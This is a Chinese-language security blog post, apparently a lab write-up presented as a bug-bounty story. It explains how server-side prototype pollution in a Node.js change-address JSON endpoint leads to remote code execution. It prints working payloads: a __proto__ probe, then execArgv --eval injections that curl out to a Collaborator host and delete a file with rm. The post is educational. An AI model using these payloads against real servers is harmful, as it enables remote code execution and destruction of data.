---
title: 赏金实战｜从修改地址到远程代码执行，服务端原型链污染的威力有多可怕？
url: https://mp.weixin.qq.com/s/7g8KLLciQqZujzGCczy_Nw
source: Doonsec's feed
date: 2026-05-25
fetch_date: 2026-05-26T06:08:09.671565
---

# 赏金实战｜从修改地址到远程代码执行，服务端原型链污染的威力有多可怕？

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/qg1MKHx3jGEOcSqRCwSZApDWBVDH1P5RSnLZ7vo81iaiaPUiarDUDqtktG3skASib4baXibgEwSuTxgvkyniaibXuXiaRZMgibS0llcsvnKDAnOK0L3c/0?wx_fmt=jpeg)

# 赏金实战｜从修改地址到远程代码执行，服务端原型链污染的威力有多可怕？

原创

升斗安全XiuXiu
升斗安全XiuXiu

升斗安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**【文章说明】**

* **目的**：本文内容仅为网络安全**技术研究与教育**目的而创作。
* **红线**：严禁将本文知识用于任何**未授权**的非法活动。使用者必须遵守《网络安全法》等相关法律。
* **责任**：任何对本文技术的滥用所引发的**后果自负**，与本公众号及作者无关。
* **免责**：内容仅供参考，作者不对其准确性、完整性作任何担保。

**阅读即代表您同意以上条款。**

今天聊个特别有意思的案例，从一个不起眼的地址修改功能，一路摸到服务器权限。全程没有花里胡哨的骚操作，就是顺着逻辑往下挖，你会发现有时候漏洞就在眼皮底下，只是我们习惯性忽略了那些“不太对劲”的地方。

今天分享的这个案例，就是一种“串线”的典型。目标站点看起来很普通，有个地址修改功能，还有个管理员才能用的系统维护面板。单独看每个功能都没啥问题，但把两个凑一块，事情就变得有意思了。

第一步：把目标盯上那个不起眼的地址修改

登录之后，我习惯性地去账户页面转了一圈，随手改了个收货地址，然后立刻切到 Burp 的 HTTP 历史里翻看。

找到了，POST /my-account/change-address 这个请求。

一眼扫过去我就来精神了，前端提交的表单数据，被原封不动地包装成 JSON 发往了服务端。更有意思的是，服务端返回的响应也是一个 JSON 对象，里面包含着更新后的用户完整信息。这说明什么？说明服务器拿到我提交的数据后，大概率直接拿去拼装对象了，连个过滤都懒得做。

![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGEMBFdBFBVKzNcmVqDKVSbEFLjnvicoOk6dANgU7lwZ854TlSjQhkP0ul6cJHktDgic8xIRN7gp4bKJQ8MLzB2ruQuu4jXAjJA30/640?wx_fmt=png&from=appmsg)

看到这种“来者不拒”的 JSON 合并操作，脑子里就应该条件反射地蹦出四个字：原型污染。

第二步：手贱加个 \_\_proto\_\_ 试试水

二话不说，把请求扔进 Repeater，开始在 JSON 里动手脚。我在请求体里塞了这么一个玩意儿：

```
"__proto__": {    "json spaces": 10}
```

点击发送，然后盯着响应面板的“原始”视图。

![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGHiceYgjDDvjBbmYuhUSvJVCBLHQRlePzLLvHqkl8NYpPW8p6LrJukjrKpqU2Mmzu2V3sUc0DQbD5HC8r6rIvibH9EyfUqUlu7EU/640?wx_fmt=png&from=appmsg)

如果你做过前端开发，肯定知道 JSON.stringify 有个 space 参数，用来控制缩进空格数。正常情况下，服务器返回的 JSON 缩进是固定的。但你看，这响应的缩进明显变大了，每个层级都多了好几格空格。

就这一个细节，我心里基本有底了，原型污染成功。我注入的那个 json spaces 属性，已经悄咪咪地挂到了全局 Object.prototype 上，后续服务器在做 JSON 序列化的时候，全都被我“带歪”了节奏。

第三步：从污染到执行，还差一个“帮手”

单靠原型污染本身，大多数情况下只能搞点信息泄露或者逻辑绕过，想直接拿到命令执行，你得再往前想一步。

我开始在站点里瞎逛，翻到了管理面板。这里有个按钮，写着“运行维护任务”。点一下试试，页面提示正在清理数据库和文件系统，过了几秒返回结果。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qg1MKHx3jGFtXyynOe8qVF4w8VBuXX20M7824D3bDzDsA2qZicm8ZBX8NibAh3S1g6icdStVJScHhU4PjN6BicfDUza9liag4zfh8uemx79slmj4/640?wx_fmt=png&from=appmsg)

这个行为太典型了，后台几乎百分百是调用了 Node.js 的 child\_process 模块去开子进程干这些脏活累活。而子进程在启动的时候，恰恰会读取 execArgv 这个属性来拼接命令行参数。

这不就串起来了吗？我能污染原型，而这个被污染的属性又会被子进程老老实实地读走。

思路通了的瞬间，payload 的骨架就出来了：

```
"__proto__": {    "execArgv": [        "--eval=require('child_process').execSync('curl https://你的COLLABORATOR地址.oastify.com')"    ]}
```

我把这个请求发出去，回到浏览器再次点击“运行维护任务”。这次页面报了错，两个任务都执行失败了。但别慌，任务失败不重要，重要的是我的 --eval 参数有没有被带进去。

切到 Burp 的 Collaborator 选项卡，点击轮询。几秒钟后，DNS 和 HTTP 交互记录齐刷刷地弹了出来。

![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGHfGcpZdZicArW4eG2ECK3p7lIicAWicf1s1zq2eVlP2YfaoKxEG3r4x2zxlutJVrYs2Kqmd288Sp6icw1krV4zFKvC1SGicoH4gH4U/640?wx_fmt=png&from=appmsg)

那一刻，我知道远程代码执行到手了。

第四步：收网，让靶标落地

验证了命令能跑，剩下的就简单了。回到 Repeater，把 curl 命令替换成删除目标文件的指令：

```
"__proto__": {    "execArgv": [        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"    ]}
```

发请求，再回管理面板点一次维护任务。服务器就会执行我们注入的远程代码，并将 /home/carlos/morale.txt 文件删除了。

回顾整个攻击链，你会发现每一步都走得特别自然：看到一个会反射用户数据的 JSON 接口，试试原型污染；发现站点用了 JSON.stringify 而且对缩进敏感，确认污染生效；翻到后台能触发子进程的功能，马上联想到用 execArgv 去搭桥。整个过程中，没有一步是硬拗出来的，全是顺着应用本身的逻辑往下走。

如果今天这篇分享让你对原型污染的利用有了新思路，动动手指点个赞，让我知道你喜欢这样的实战拆解。关注本号，后续我还会继续聊更多挖洞中的骚操作和踩坑经验。觉得有用的话，欢迎转发给身边一起挖洞的兄弟，也别忘了点个在看，让更多人看到这条通往 RCE 的非主流路子。

咱们下期见。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q3dczfibZoF9yHlbaEAZlyAIEESDEormKCrZ6rcbTRQJmoEue8IM2TYNQBALdCunnotXlsr8icWqvUg/0?wx_fmt=png)

升斗安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q3dczfibZoF9yHlbaEAZlyAIEESDEormKCrZ6rcbTRQJmoEue8IM2TYNQBALdCunnotXlsr8icWqvUg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过